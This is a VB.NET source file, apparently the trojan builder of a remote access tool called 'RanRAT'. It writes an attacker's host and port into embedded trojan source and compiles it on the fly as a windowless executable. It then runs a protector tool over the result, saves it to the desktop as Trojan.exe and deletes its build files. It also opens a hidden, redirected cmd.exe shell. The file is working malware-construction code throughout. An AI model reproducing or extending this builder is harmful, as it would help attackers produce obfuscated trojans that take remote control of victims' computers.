Imports System.CodeDom.Compiler
Imports Microsoft.Win32

Public Class Buildtrojan
    Private RichTextBox1 As New RichTextBox
#Region "Start Command Machine "


    Private Sub RS(ByVal a As Object, ByVal e As Object)
        Try
            RichTextBox1.Text &= vbNewLine & e.Data
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

#End Region


    Private DJB As Object
    Private wholepath As String = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)
    Private Sub cmdload()
        Me.CheckForIllegalCrossThreadCalls = False
        Try
            Try
                DJB.Kill()
            Catch ex As Exception
            End Try
            DJB = New Process
            DJB.StartInfo.RedirectStandardOutput = True
            DJB.StartInfo.RedirectStandardInput = True
            DJB.StartInfo.RedirectStandardError = True
            DJB.StartInfo.FileName = "cmd.exe"
            DJB.StartInfo.RedirectStandardError = True
            AddHandler CType(DJB, Process).OutputDataReceived, AddressOf RS
            AddHandler CType(DJB, Process).ErrorDataReceived, AddressOf RS
            DJB.StartInfo.UseShellExecute = False
            DJB.StartInfo.CreateNoWindow = True
            DJB.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            DJB.EnableRaisingEvents = True

            DJB.Start()
            DJB.BeginErrorReadLine()
            DJB.BeginOutputReadLine()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub writer()
        Try
            System.IO.Directory.CreateDirectory(wholepath & "\" & "Builder")
            System.IO.File.WriteAllBytes(wholepath & "\" & "Builder" & "\" & "project.nrproj", My.Resources.project)
            System.IO.File.WriteAllBytes(wholepath & "\" & "Builder" & "\" & "reac.exe", My.Resources.reac)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub commander()
        Try
            Form1.RichTextBox1.AppendText("Please Wait for Adding References....." & vbNewLine)
            Dim qu As String = """"
            Dim reacdir As String = wholepath & "\" & "Builder" & "\"
            Dim command As String = "reac.exe   -file " & qu & reacdir & "trojan.exe" & qu & "  -project " & qu & reacdir & "project.nrproj" & qu
            '-project " & wholepath & "\" & "Builder" & "\" & "project.nrproj"
            '  MsgBox(reacdir & command)
            ''   
            Dim fullc As String = reacdir & command
            Shell(fullc)

        Catch ex As Exception
            MsgBox("EX : " & ex.Message)
        End Try
    End Sub


    Private Sub Buildtrojan_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.Host.Text = Form1.getBuilderHost
        Me.Port.Text = Form1.getBuilderPort

    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Try
            Dim x As Integer = Integer.Parse(Port.Text)
            Form1.setBuilderHost(Host.Text)
            Form1.setBuilderPort(x)
            MsgBox("New Settings Saved !" & vbNewLine & "You can now run command : save out", MsgBoxStyle.Information)
            Me.Close()
        Catch ex As Exception

            MsgBox("Cannot Save Setting Error : " & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub
    Friend Sub saveout()
       
            Dim sfd As New SaveFileDialog
            sfd.Filter = "Executables | *.exe"
            writer()
        sfd.FileName = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) & "\" & "Builder" & "\" & "trojan.exe"

            Dim source As String = My.Resources.svchdec1

            source = source.Replace("[NoIP]", Form1.getBuilderHost)
            source = source.Replace("PPPPP", Form1.getBuilderPort) '[SSSAAAA]
            source = source.Replace("[SSSAAAA]", Form1.getBuilderName)
            Dim CodeDom As New CodDom
        If CodeDom.Compile(sfd.FileName, source) = True Then
            Form1.RichTextBox1.AppendText(vbNewLine)
            Form1.RichTextBox1.AppendText("Please Wait for Creating the Assembly....." & vbNewLine)
            Timer1.Start()
        End If




    End Sub
    Private Sub copier()
        Try
            Dim reacdir As String = wholepath & "\" & "Builder" & "\"
            If IO.File.Exists(reacdir & "trojan_Secure\trojan.exe") Then
                If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & "Trojan.exe") Then
                    Try
                        IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & "Trojan.exe")
                        System.IO.File.Copy(reacdir & "trojan_Secure\trojan.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & "Trojan.exe")
                        Form1.RichTextBox1.AppendText("File Saved to Desktop , Name : Trojan.exe" & vbNewLine)
                        MsgBox("Done " & vbNewLine & " Saved to Desktop  " & vbNewLine & " Path : " & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & "Trojan.exe", MsgBoxStyle.Information)
                        Form1.RichTextBox1.AppendText(vbNewLine & "RanRAT@" & Environment.UserName & ": ")

                        Form1.RichTextBox1.ScrollToCaret()
                        System.IO.Directory.Delete(reacdir, True)
                        Timer2.Stop()
                        Exit Sub
                    Catch ex As Exception
                        MsgBox("Cannot Delete File : " & vbNewLine & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & "Trojan.exe" & vbNewLine & "Error : " & ex.Message & "don`t press ok till you delete the file , may be in use [Running] ", MsgBoxStyle.Critical)
                        MsgBox("New Trojan file not Saved !!!!", MsgBoxStyle.Critical)
                    End Try
                Else

                    System.IO.File.Copy(reacdir & "trojan_Secure\trojan.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & "Trojan.exe")
                    Form1.RichTextBox1.AppendText("File Saved to Desktop , Name : Trojan.exe" & vbNewLine)
                    MsgBox("Done " & vbNewLine & " Saved to Desktop  " & vbNewLine & " Path : " & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & "Trojan.exe", MsgBoxStyle.Information)
                    Form1.RichTextBox1.AppendText(vbNewLine & "RanRAT@" & Environment.UserName & ": ")

                    Form1.RichTextBox1.ScrollToCaret()
                    System.IO.Directory.Delete(reacdir, True)
                    Timer2.Stop()
                    Exit Sub

                End If
                
                Return
            Else
                MsgBox("Error : Cannot Build Trojan File ", MsgBoxStyle.Critical)

            End If
        Catch ex As Exception
            MsgBox("Failure : " & ex.Message, MsgBoxStyle.Critical)
        End Try

    End Sub
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        commander()
        Timer1.Stop()
        Form1.RichTextBox1.AppendText("Please Wait for Compile on the Fly....." & vbNewLine)
        Timer2.Start()
        Exit Sub
    End Sub

    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        copier()
        Form1.RichTextBox1.AppendText("Please Wait for Replacing Temp Arrays....." & vbNewLine)
        Timer2.Stop()
        Exit Sub
    End Sub
End Class
Friend Class CodDom
    Public Function Compile(ByVal Filname As String, ByVal source As String) As Boolean
                Dim Compiler As CodeDomProvider = CodeDomProvider.CreateProvider("VisualBasic")'//Specify the Programming Language 
                '//If you need to compile a C# code on the fly , replace "VisualBasic" by "C#" 

        Dim Parameters As New CompilerParameters
        Dim cResults As CompilerResults
        Parameters.TreatWarningsAsErrors = False  'source, client, crdp
        Parameters.GenerateExecutable = True
        Parameters.OutputAssembly = Filname
                '// Adding The Required Important main DLL Assemblies 
        Parameters.ReferencedAssemblies.Add("System.dll")
        Parameters.ReferencedAssemblies.Add("System.Collections.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.dll")
        Parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
        Parameters.ReferencedAssemblies.Add("System.Xml.dll")
        Parameters.ReferencedAssemblies.Add("System.IO.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        Parameters.ReferencedAssemblies.Add("System.Globalization.dll")
        Parameters.ReferencedAssemblies.Add("System.Drawing.dll")
        '    Parameters.ReferencedAssemblies.Add("C:\Users\Admin\Desktop\Cam.dll")
        '   Parameters.ReferencedAssemblies.Add("C:\Users\Admin\Desktop\rec.dll")
        Parameters.CompilerOptions = " /target:winexe"

        Dim x As String() = {source}

        cResults = Compiler.CompileAssemblyFromSource(Parameters, source)





        If cResults.Errors.HasErrors Then

            For Each CompilerError_loopVariable As CompilerError In cResults.Errors

                Dim error1 As New CompilerError
                If error1.IsWarning = True Then
                        '// bypass , warnings that they are not errors , but they are labeled with a yellow triangle in the visual studio error list 
                        '// so it is like UnCheking "Treat all Warnings as Errors"
                    GoTo bypass
                Else
                    error1 = CompilerError_loopVariable
                        '// Msg up the Errors , NOTE : Here the errors are diffrent , like :
                        '// If you type in visual studio "ImageFormat.Jpeg"
                        '//here of you typed that will get an error , you have to type it in details as "System.Drawing.Imaging.ImageFormat.Jpeg"
                        '//and the same with every thing , also exception , System.Exception
                        '// also file , System.IO.file
                        '//and the same to the rest with graphics , etc , timers , forms , etc , i guess you got the idea :D 
                    MessageBox.Show("Error: " + error1.ErrorText & vbNewLine & "Line : " & error1.Line, "", MessageBoxButtons.OK, MessageBoxIcon.Error)

                End If
bypass:
            Next
            Return False
        ElseIf cResults.Errors.HasErrors = False Then
            Return True

        End If
        Return True
    End Function


End Class
